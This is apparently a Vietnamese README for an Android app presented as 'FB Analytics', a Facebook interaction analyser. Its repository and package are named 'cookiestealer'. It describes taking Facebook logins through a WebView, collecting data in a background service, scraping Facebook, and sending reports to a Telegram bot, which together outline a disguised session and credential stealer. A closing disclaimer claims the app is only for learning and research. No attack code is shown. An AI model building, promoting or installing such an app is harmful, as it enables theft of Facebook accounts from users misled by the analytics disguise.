# FB Analytics

<div align="center">

![Android](https://img.shields.io/badge/Platform-Android-green.svg)
![Kotlin](https://img.shields.io/badge/Language-Kotlin-blue.svg)
![Min SDK](https://img.shields.io/badge/Min%20SDK-24-orange.svg)
![Target SDK](https://img.shields.io/badge/Target%20SDK-34-orange.svg)

Ứng dụng Android phân tích và theo dõi tương tác trên Facebook

</div>

## 📋 Mô tả

**FB Analytics** là một ứng dụng Android được xây dựng bằng Kotlin, cho phép người dùng phân tích và theo dõi các tương tác trên Facebook. Ứng dụng cung cấp thông tin chi tiết về hoạt động của người dùng và bạn bè trên nền tảng mạng xã hội.

## ✨ Tính năng chính

- 🔐 **Đăng nhập Facebook**: Đăng nhập an toàn qua WebView với xác thực token
- 📊 **Phân tích dữ liệu**: Hiển thị thống kê chi tiết về tương tác
- 👥 **Quản lý bạn bè**: Theo dõi và phân tích tương tác với bạn bè
- 🔄 **Thu thập dữ liệu nền**: Dịch vụ chạy ngầm để thu thập thông tin
- 📱 **Giao diện hiện đại**: Thiết kế Material Design với hiệu ứng mượt mà
- 🎨 **Glass Morphism UI**: Giao diện đẹp mắt với hiệu ứng kính mờ
- 🔔 **Thông báo**: Hỗ trợ thông báo foreground service
- 📡 **Tích hợp Telegram**: Gửi báo cáo qua Telegram Bot

## 🏗️ Kiến trúc

### Các Activity chính:

- **MainActivity**: Màn hình chính và landing page
- **LoginActivity**: Xử lý đăng nhập Facebook qua WebView
- **AnalysisActivity**: Hiển thị phân tích và thống kê dữ liệu

### Các Component:

- **DataCollectorService**: Foreground Service thu thập dữ liệu nền
- **FacebookApiHelper**: Xử lý API requests đến Facebook
- **FacebookScraper**: Thu thập và parse dữ liệu từ Facebook
- **InteractionDatabase**: Quản lý cơ sở dữ liệu local
- **TelegramSender**: Gửi thông báo qua Telegram Bot

## 🛠️ Công nghệ sử dụng

- **Ngôn ngữ**: Kotlin
- **Min SDK**: Android 7.0 (API 24)
- **Target SDK**: Android 14 (API 34)
- **UI Framework**: 
  - Jetpack Compose
  - Material Design 3
  - Traditional XML Layouts
- **Networking**: OkHttp3
- **Async**: Kotlin Coroutines
- **WebView**: Android WebView với JavaScript enabled

## 📦 Dependencies

```gradle
// Core Android
androidx.core:core-ktx:1.12.0
androidx.appcompat:appcompat:1.6.1
com.google.android.material:material:1.11.0

// Networking
com.squareup.okhttp3:okhttp:4.12.0

// Coroutines
org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3

// Jetpack Compose
androidx.compose:compose-bom:2023.08.00
androidx.compose.material3:material3
androidx.activity:activity-compose:1.8.2
androidx.lifecycle:lifecycle-runtime-compose:2.7.0
```

## 📱 Yêu cầu hệ thống

- Android 7.0 (API 24) trở lên
- Kết nối Internet
- Tài khoản Facebook

## 🔐 Quyền truy cập

Ứng dụng yêu cầu các quyền sau:

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
```

## 🚀 Cài đặt

### Clone repository:

```bash
git clone https://github.com/duydat1412/cookiestealer.git
```

### Mở project trong Android Studio:

1. Mở Android Studio
2. Chọn "Open an Existing Project"
3. Chọn thư mục `cookiestealer`
4. Đợi Gradle sync hoàn tất

### Build và chạy:

1. Kết nối thiết bị Android hoặc mở emulator
2. Nhấn "Run" (Shift + F10) hoặc biểu tượng ▶️

## 📝 Cấu hình

### Build Variants:

- **Debug**: Build cho development và testing
- **Release**: Build tối ưu cho production

### ProGuard:

File cấu hình tại `app/proguard-rules.pro` (hiện tại minify disabled)

## 🎨 Giao diện

Ứng dụng sử dụng theme tùy chỉnh với:

- Glass morphism effects
- Gradient backgrounds
- Smooth animations (fade in, slide up, scale)
- Material Design 3 components
- Custom drawables và icons

## 📊 Cấu trúc Database

Ứng dụng sử dụng SQLite local database để lưu trữ:

- Thông tin tương tác
- Dữ liệu người dùng
- Cache API responses

## 🔧 Development

### Package structure:

```
com.example.cookiestealer/
├── MainActivity.kt
├── LoginActivity.kt
├── AnalysisActivity.kt
├── DataCollectorService.kt
├── FacebookApiHelper.kt
├── FacebookScraper.kt
├── InteractionDatabase.kt
├── TelegramSender.kt
└── ui/theme/
    ├── Color.kt
    ├── Theme.kt
    └── Type.kt
```

## ⚠️ Lưu ý quan trọng

- Ứng dụng này được phát triển cho mục đích học tập và nghiên cứu
- Tuân thủ chính sách và điều khoản sử dụng của Facebook
- Bảo mật thông tin đăng nhập của người dùng
- Không chia sẻ hoặc lưu trữ thông tin cá nhân trái phép

## 📄 License

Dự án này được phát hành dưới giấy phép MIT License.

## 👨‍💻 Tác giả

**Duy Đạt**

- Facebook: [duydat141207](https://fb.com/duydat141207)
- GitHub: [@duydat1412](https://github.com/duydat1412)

## 🤝 Đóng góp

Mọi đóng góp đều được chào đón! Hãy tạo pull request hoặc mở issue để báo cáo lỗi và đề xuất tính năng mới.

## 📞 Liên hệ

Nếu có bất kỳ câu hỏi hoặc góp ý nào, vui lòng liên hệ qua:

- Email: [Tạo issue trên GitHub]
- Facebook: https://fb.com/duydat141207

---

<div align="center">
Made with ❤️ by Duy Đạt
</div>
